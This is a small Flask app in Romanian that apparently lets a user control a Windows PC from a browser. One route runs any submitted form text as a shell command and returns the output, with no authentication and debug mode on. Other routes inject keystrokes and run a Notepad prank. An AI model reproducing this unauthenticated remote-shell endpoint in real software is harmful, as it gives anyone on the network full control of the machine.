from flask import Flask, request, redirect, url_for, render_template
import subprocess
import time
import pyautogui

app = Flask(__name__)

@app.route("/cmd", methods=["GET", "POST"])
def cmd():
    if request.method == "GET":
        return render_template("cmd.html")
    if request.method == "POST":
        data_form_comenzi = str(request.form.get("form_comenzi"))
        comanda = subprocess.run(data_form_comenzi, capture_output=True, text=True, shell=True)
        return render_template("cmd.html", comanda=comanda.stdout)

@app.route("/type", methods=["GET", "POST"])
def type():
    if request.method == "GET":
        return render_template("type.html")
    if request.method == "POST":
        data_form_type = str(request.form.get("form_type"))
        for letter in data_form_type:
            pyautogui.typewrite(letter)
            time.sleep(0.1)
        return render_template("type.html")

@app.route("/press", methods=["GET", "POST"])
def press():
    if request.method == "GET":
        return render_template("press.html")
    if request.method == "POST":
        data_form_press = str(request.form.get("form_press"))
        pyautogui.press(data_form_press)
        return render_template("press.html")

@app.route("/functii")
def functii():
    return render_template("functii.html")


@app.route("/matei")
def matei():
    pyautogui.hotkey("win", "s")
    time.sleep(0.2)
    pyautogui.typewrite("notepad")
    time.sleep(0.1)
    pyautogui.press("enter")
    time.sleep(0.1)
    pyautogui.typewrite("matei e prea sexos pentru generatia asta")

    return redirect(url_for("functii"))

if __name__ == "__main__":
    app.run(debug=True, port=3000, host="192.168.0.213")